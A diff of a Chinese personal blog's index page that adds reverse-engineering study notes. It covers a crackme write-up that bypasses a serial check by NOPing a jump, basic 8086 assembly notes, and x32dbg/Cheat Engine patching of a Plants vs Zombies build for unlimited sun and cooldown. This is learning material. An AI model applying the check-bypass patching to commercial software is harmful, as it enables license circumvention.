@@ -112,7 +112,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-count">26</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -130,6 +130,569 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://cotton-star.github.io/2024/08/05/re/crackme160/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="cotton-star">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Hexo">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2024/08/05/re/crackme160/" class="post-title-link" itemprop="url">crackme160</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2024-08-05 10:17:33 / Modified: 11:15:38" itemprop="dateCreated datePublished" datetime="2024-08-05T10:17:33+08:00">2024-08-05</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由于有一些因为病毒打不开暂时跳过</span><br></pre></td></tr></table></figure>
+
+<h1 id="1-Daniel-rj"><a href="#1-Daniel-rj" class="headerlink" title="1.Daniel-rj"></a>1.Daniel-rj</h1><h2 id="1-1-爆破"><a href="#1-1-爆破" class="headerlink" title="1.1 爆破"></a>1.1 爆破</h2><p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240805102017191.png" alt="image-20240805102017191"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">要爆破其实很简单,通过dbg找到这个提示字符串</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240805102047842.png" alt="image-20240805102047842"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们分析上下文,发现这个jne是判断失败的关键,直接把他nop即可</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240805102121750.png" alt="image-20240805102121750"></p>
+<h2 id="1-2-算法"><a href="#1-2-算法" class="headerlink" title="1.2 算法"></a>1.2 算法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一般来说有循环的会存在算法</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240805102337621.png" alt="image-20240805102337621"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在附近找到这个,在一步步分析后,发现用户与密码的关系,就是+5</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240805110956500.png" alt="image-20240805110956500"></p>
+<h1 id="2-Bjanes"><a href="#2-Bjanes" class="headerlink" title="2.Bjanes"></a>2.Bjanes</h1><p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240805111527293.png" alt="image-20240805111527293"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">依然是先找字符串</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://cotton-star.github.io/2024/08/05/re/%E6%B1%87%E7%BC%96%E5%A4%96/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="cotton-star">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Hexo">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2024/08/05/re/%E6%B1%87%E7%BC%96%E5%A4%96/" class="post-title-link" itemprop="url">记一记汇编小知识</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2024-08-05 10:17:09" itemprop="dateCreated datePublished" datetime="2024-08-05T10:17:09+08:00">2024-08-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2024-04-25 15:55:54" itemprop="dateModified" datetime="2024-04-25T15:55:54+08:00">2024-04-25</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h1><p> 所有寄存器都是16位</p>
+<p> 首先介绍通用寄存器AX</p>
+<p> 它能够保留2^16-1的数据,用十六进制表示就是FFFFH</p>
+<p> eg:</p>
+<p> 在AX中存储18D</p>
+<p> —12H</p>
+<p> —10010B  在低位10010高位全是0,就像这样</p>
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240414165241454.png" alt="image-20240414165241454"></p>
+<ul>
+<li>有一个问题: 8086上一代CPU的寄存器都是八位的,怎么保证程序的兼容性</li>
+</ul>
+<p>通用寄存器均可以分为两个独立的8位寄存器使用   例如:AX可以分为AH和AL,AX,BX CX,DX都是如此</p>
+<h2 id="字"><a href="#字" class="headerlink" title="字"></a>字</h2><ul>
+<li><p>8086是16位CPU</p>
+<p>就是说8086的字长是16位</p>
+</li>
+<li><p>一个字可以存在一个16位寄存器中</p>
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240414165842227.png" alt="image-20240414165842227"></p>
+</li>
+</ul>
+<h1 id="mov和add指令"><a href="#mov和add指令" class="headerlink" title="mov和add指令"></a>mov和add指令</h1><p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240414170341478.png" alt="image-20240414170341478"></p>
+<p>add al,bl    意思是把bx的低八位和ax的低八位相加结果给al即ax的低八位</p>
+<p>同理ah为ax的高八位</p>
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240414192922466.png" alt="image-20240414192922466"></p>
+<p>最后一句需要注意</p>
+<p>al位置的值发生溢出是,不会向ax进位,直接丢弃</p>
+<h1 id="确定物理地址的方法"><a href="#确定物理地址的方法" class="headerlink" title="确定物理地址的方法"></a>确定物理地址的方法</h1><p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240414193712000.png" alt="image-20240414193712000"></p>
+<h1 id="内存的分段表示法"><a href="#内存的分段表示法" class="headerlink" title="内存的分段表示法"></a>内存的分段表示法</h1><p>!!! 内存并没有分段,段的划分来自CPU</p>
+<p>偏移地址16位,所以只能寻址64k,范围为0~ffffH</p>
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240414195311928.png" alt="image-20240414195311928"></p>
+<p>段地址很重要,用专门的寄存器存放段地址</p>
+<p>有四个段寄存器</p>
+<p>CS–代码段  DS–数据段</p>
+<p>SS–堆栈段  ES–附加段寄存器</p>
+<h1 id="DEBUG"><a href="#DEBUG" class="headerlink" title="DEBUG"></a>DEBUG</h1><p>debug是一个调试程序</p>
+<p>能查看CPU中各种寄存器的内容内存的情况</p>
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240414200032907.png" alt="image-20240414200032907"></p>
+<p>jmp 1000:0 跳转到此位置</p>
+<p>jmp ax 把ip 跳到ax的位置</p>
+<h1 id="cpu从内存单元中要读取数据"><a href="#cpu从内存单元中要读取数据" class="headerlink" title="cpu从内存单元中要读取数据"></a>cpu从内存单元中要读取数据</h1><p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240416215751009.png" alt="image-20240416215751009"></p>
+<h1 id="DS与数据段"><a href="#DS与数据段" class="headerlink" title="DS与数据段"></a>DS与数据段</h1><p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240416223911145.png" alt="image-20240416223911145"></p>
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240416225044670.png" alt="image-20240416225044670"></p>
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240416225055159.png" alt="image-20240416225055159"></p>
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240416230132763.png" alt="image-20240416230132763"></p>
+<h1 id="div"><a href="#div" class="headerlink" title="div"></a>div</h1><p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240424203114589.png" alt="image-20240424203114589"></p>
+<h1 id="jmp"><a href="#jmp" class="headerlink" title="jmp"></a>jmp</h1><p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240425142631260.png" alt="image-20240425142631260"><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240425142946054.png" alt="image-20240425142946054"><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240425144756599.png" alt="image-20240425144756599"><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240425150047438.png" alt="image-20240425150047438"></p>
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240425150313841.png" alt="image-20240425150313841"></p>
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240425151854218.png" alt="image-20240425151854218"></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://cotton-star.github.io/2024/08/05/re/%E9%80%86%E5%90%91/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="cotton-star">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Hexo">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2024/08/05/re/%E9%80%86%E5%90%91/" class="post-title-link" itemprop="url">逆向</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2024-08-05 10:16:07" itemprop="dateCreated datePublished" datetime="2024-08-05T10:16:07+08:00">2024-08-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2024-07-30 10:00:54" itemprop="dateModified" datetime="2024-07-30T10:00:54+08:00">2024-07-30</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="一-xdb基础篇"><a href="#一-xdb基础篇" class="headerlink" title="一.xdb基础篇"></a>一.xdb基础篇</h1><h2 id="1-逆向准备"><a href="#1-逆向准备" class="headerlink" title="1.逆向准备"></a>1.逆向准备</h2><h3 id="1-1-xdb简单使用"><a href="#1-1-xdb简单使用" class="headerlink" title="1.1 xdb简单使用"></a>1.1 xdb简单使用</h3><p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240630201904347.png" alt="image-20240630201904347"></p>
+<p>点击左上角</p>
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240630202702886.png" alt="image-20240630202702886"></p>
+<p>点击附加</p>
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240630202831498.png" alt="image-20240630202831498"></p>
+<p>将要的文件附加进去</p>
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240703151750213.png" alt="image-20240703151750213"></p>
+<h3 id="1-2-实现用x32dbg分析阳光"><a href="#1-2-实现用x32dbg分析阳光" class="headerlink" title="1.2.实现用x32dbg分析阳光"></a>1.2.实现用x32dbg分析阳光</h3><ul>
+<li><p>只是用(杂交版)学习动态调试</p>
+</li>
+<li><p>先用ce将阳光的基址找出</p>
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240703134446355.png" alt="image-20240703134446355"></p>
+</li>
+</ul>
+<p>即</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">阳光基址:[PlantsVsZombies-nosig+vmem+vard.exe&quot;+2A9EC0]+768]+5560]</span><br><span class="line"></span><br><span class="line">种植卡片时访问的地址:008AF806 - 89 B7 60550000  - mov [edi+00005560],esi</span><br><span class="line">(在Xdbg有两种方式寻找地址</span><br><span class="line">1:用ctrl+G寻找008AF806</span><br><span class="line">2.直接寻找断点,上次作业保留的)</span><br><span class="line">减号可以返回上一页</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">0041BA60 | 56                       | push esi                                            |</span><br><span class="line">0041BA61 | 8BB7 60550000            | mov esi,dword ptr ds:[edi+5560]                     | esi=阳光值</span><br><span class="line">0041BA67 | 8BD7                     | mov edx,edi                                         | edx:&amp;&quot;p咢&quot;, edi:&amp;&quot;p咢&quot;</span><br><span class="line">0041BA69 | E8 12FFFFFF              | call plantsvszombies-nosig+vmem+vard.41B980         |</span><br><span class="line">0041BA6E | 03C6                     | add eax,esi                                         |</span><br><span class="line">0041BA70 | 3BD8                     | cmp ebx,eax                                         |</span><br><span class="line">0041BA72 | 7F 0C                    | jg plantsvszombies-nosig+vmem+vard.41BA80           |</span><br><span class="line">0041BA74 | 2BF3                     | sub esi,ebx                                         | ebx=种植卡片所需的阳光</span><br><span class="line">0041BA76 | E9 853D4900              | jmp &lt;plantsvszombies-nosig+vmem+vard.sub_8AF800&gt;    |</span><br><span class="line">0041BA7B | 90                       | nop                                                 |</span><br><span class="line">0041BA7C | B0 01                    | mov al,1                                            |</span><br><span class="line">0041BA7E | 5E                       | pop esi                                             |</span><br><span class="line">0041BA7F | C3                       | ret                                                 |</span><br><span class="line">0041BA80 | 8B8F 8C000000            | mov ecx,dword ptr ds:[edi+8C]                       | [edi+8C]:&quot;爗f&quot;</span><br><span class="line">0041BA86 | 8B01                     | mov eax,dword ptr ds:[ecx]                          |</span><br><span class="line">0041BA88 | 8B15 607B6A00            | mov edx,dword ptr ds:[6A7B60]                       | edx:&amp;&quot;p咢&quot;</span><br><span class="line">0041BA8E | 8B80 D8000000            | mov eax,dword ptr ds:[eax+D8]                       |</span><br><span class="line">0041BA94 | 52                       | push edx                                            | edx:&amp;&quot;p咢&quot;</span><br><span class="line">0041BA95 | FFD0                     | call eax                                            |</span><br><span class="line">0041BA97 | C787 78550000 46000000   | mov dword ptr ds:[edi+5578],46                      | 46:&#x27;F&#x27;</span><br><span class="line">0041BAA1 | 32C0                     | xor al,al                                           |</span><br><span class="line">0041BAA3 | 5E                       | pop esi                                             |</span><br><span class="line">0041BAA4 | C3                       | ret                                                 |</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">008AF800 | 019F CC570000            | add dword ptr ds:[edi+57CC],ebx                     |</span><br><span class="line">008AF806 | 89B7 60550000            | mov dword ptr ds:[edi+5560],esi                     | 种植阳光时访问的</span><br><span class="line">008AF80C | E9 6BC2B6FF              | jmp plantsvszombies-nosig+vmem+vard.41BA7C          |</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">通过分析,我们可以发现,mov dword ptr ds:[edi+5560],esi,要把esi给这个值,同时看见esi的值就是当前剩余阳光数值</span><br><span class="line">再看代码sub esi,ebx,发现esi在这里进行了改变,通关减去edx的值吧esi减少,ebx即卡片所需阳光</span><br><span class="line">因此,我们将sub改成add即可将阳光不减反增</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240703142101374.png" alt="image-20240703142101374"></p>
+<p>通过在内存窗口中转到地址,我们能够更清晰的分析阳光的变化,要记得将内存中的值改为32位有符号位</p>
+<h3 id="1-3-实现永久自动增加阳光"><a href="#1-3-实现永久自动增加阳光" class="headerlink" title="1.3 实现永久自动增加阳光"></a>1.3 实现永久自动增加阳光</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由于每次关闭都会重置,要想永久自动我们需要打补丁</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240703142903032.png" alt="image-20240703142903032"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">图片最上方那个向创口贴一样的就是补丁</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240703143210349.png" alt="image-20240703143210349"></p>
+<p>点击修补文件,保存下来即可</p>
+<h2 id="2-逆向基础知识"><a href="#2-逆向基础知识" class="headerlink" title="2.逆向基础知识"></a>2.逆向基础知识</h2><h3 id="2-1-访问目标地址常用方法"><a href="#2-1-访问目标地址常用方法" class="headerlink" title="2.1 访问目标地址常用方法"></a>2.1 访问目标地址常用方法</h3><ol>
+<li>使用ctrl+G</li>
+<li>设置断点</li>
+<li>注释(补丁右边一个)</li>
+<li>标签(按冒号能够添加标签)</li>
+</ol>
+<h4 id="2-1-1-代码执行法"><a href="#2-1-1-代码执行法" class="headerlink" title="2.1.1 代码执行法"></a>2.1.1 代码执行法</h4><ul>
+<li>直接执行文件,一直按步过(F8)直到执行找到代码位置</li>
+</ul>
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240707184144474.png" alt="image-20240707184144474"></p>
+<h4 id="2-1-2-字符串检索法"><a href="#2-1-2-字符串检索法" class="headerlink" title="2.1.2 字符串检索法"></a>2.1.2 字符串检索法</h4><p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240707185127747.png" alt="image-20240707185127747"></p>
+<p>打开就能找到字符串,进行查找要的数据</p>
+<h4 id="2-1-3-API检索法"><a href="#2-1-3-API检索法" class="headerlink" title="2.1.3 API检索法"></a>2.1.3 API检索法</h4><p>程序放进去弹出的黑色框是messageboxw</p>
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240707185538137.png" alt="image-20240707185538137"></p>
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240707185602972.png" alt="image-20240707185602972"></p>
+<p>找到这条,点击进去就能找到</p>
+<h4 id="2-1-4-API检索法2"><a href="#2-1-4-API检索法2" class="headerlink" title="2.1.4 API检索法2"></a>2.1.4 API检索法2</h4><p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240707190735562.png" alt="image-20240707190735562"></p>
+<p>ctrl+G直接搜索MessageBoxA,MessageBoxW</p>
+<p>设置断点,进入访问</p>
+<h3 id="2-2-使用打补丁方式修改helloworld"><a href="#2-2-使用打补丁方式修改helloworld" class="headerlink" title="2.2 使用打补丁方式修改helloworld"></a>2.2 使用打补丁方式修改helloworld</h3><p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240707191334957.png" alt="image-20240707191334957"></p>
+<p>目标是把上下英文修改掉</p>
+<ol>
+<li>先找到具体的位置</li>
+</ol>
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240707191455618.png" alt="image-20240707191455618"></p>
+<ol start="2">
+<li><p>修改有两种方法:</p>
+<ul>
+<li>一是直接修改缓冲区,</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在内存中找到,全部选中,这里注意字符串末尾是以00结尾的,因此需要把00也包括进去,然后点击编辑,就可以直接修改了</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240707191834378.png" alt="image-20240707191834378"></p>
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240707192044627.png" alt="image-20240707192044627"></p>
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240707192149942.png" alt="image-20240707192149942"></p>
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240707192217206.png" alt="image-20240707192217206"></p>
+<ul>
+<li><p>二是在其他内存区域生成新字符串并传递给消息函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">怕有其他数据占用了要修改的后面的位置,造成把后面的数据破坏掉,因此一般用这种方式</span><br></pre></td></tr></table></figure>
+
+<p>我们先找到内存,往下拉,找到空的位置</p>
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240707192713552.png" alt="image-20240707192713552"></p>
+<p>直接将想要的数据填入,复制该数据的地址</p>
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240707192950925.png" alt="image-20240707192950925"></p>
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240707193607032.png" alt="image-20240707193607032"></p>
+<p>最后点击补丁,修补保存就可以了</p>
+</li>
+</ul>
+</li>
+</ol>
+<h3 id="2-3-小端序知识"><a href="#2-3-小端序知识" class="headerlink" title="2.3 小端序知识"></a>2.3 小端序知识</h3><p>大部分汇编已经介绍</p>
+<p>在x96dbg中注意这两个</p>
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240707195046107.png" alt="image-20240707195046107"></p>
+<h3 id="2-4-实现永久不减阳光"><a href="#2-4-实现永久不减阳光" class="headerlink" title="2.4 实现永久不减阳光"></a>2.4 实现永久不减阳光</h3><ul>
+<li><p>打开ce进行操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.增加阳光的地址</span><br><span class="line">00430A11 - 01 88 60550000  - add [eax+00005560],ecx</span><br><span class="line">2.减少阳光的地址</span><br><span class="line">008AF806 - 89 B7 60550000  - mov [edi+00005560],esi</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="2-4-1-第一种方法"><a href="#2-4-1-第一种方法" class="headerlink" title="2.4.1 第一种方法"></a>2.4.1 第一种方法</h4><p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240711214540981.png" alt="image-20240711214540981"></p>
+<p>查找地址</p>
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240711214832086.png" alt="image-20240711214832086"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发现这个给阳光赋值的地址,我们直接把他nop掉,那么种植时就不会减少阳光了</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-4-2-第二种方法"><a href="#2-4-2-第二种方法" class="headerlink" title="2.4.2 第二种方法"></a>2.4.2 第二种方法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">分析代码</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240711215934949.png" alt="image-20240711215934949"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们想着,能不能通过跳过这个函数来实现目的</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240711220848195.png" alt="image-20240711220848195"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在函数开头设置断点</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240711220924224.png" alt="image-20240711220924224"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">看到栈窗口的返回地址</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240711221038398.png" alt="image-20240711221038398"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">双击进入找到阳光赋值口,我们往上看</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\陈亮\AppData\Roaming\Typora\typora-user-images\image-20240711221229903.png" alt="image-20240711221229903"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">找到当al!=0是要跳过这个函数,我们直接把他改成无条件跳过,进入游戏发现阳光不减少</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-5-修改cd"><a href="#2-5-修改cd" class="headerlink" title="2.5 修改cd"></a>2.5 修改cd</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">同理用ce 找到是什么改写了这个地址,00488E73放入x32dbg</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\陈亮\AppData\Roaming\Tencent\TIM\Temp\2C0MS_GA5{P9QFL%~CSQ6{X.png" alt="2C0MS_GA5{P9QFL%~CSQ6{X"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">意外之喜,全改了</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-6-修改攻速"><a href="#2-6-修改攻速" class="headerlink" title="2.6 修改攻速"></a>2.6 修改攻速</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">用ce找到</span><br><span class="line">0045F8A9 - 83 46 58 FF - add dword ptr [esi+58],-01</span><br><span class="line"></span><br><span class="line">0045F8CA - 89 4E 58  - mov [esi+58],ecx</span><br><span class="line"></span><br><span class="line">然后再x32dbg中将-1进行更改即可,太快会只动嘴不射豆,改ecx也可以,但是改了会一直把下面的覆盖了,所以在下面一块空的区域写入想要的代码然后jmp过去,还不够的话再转一点代码过去就行了,似乎全植物同样攻速了,再快现在也不去深究了</span><br></pre></td></tr></table></figure>
+
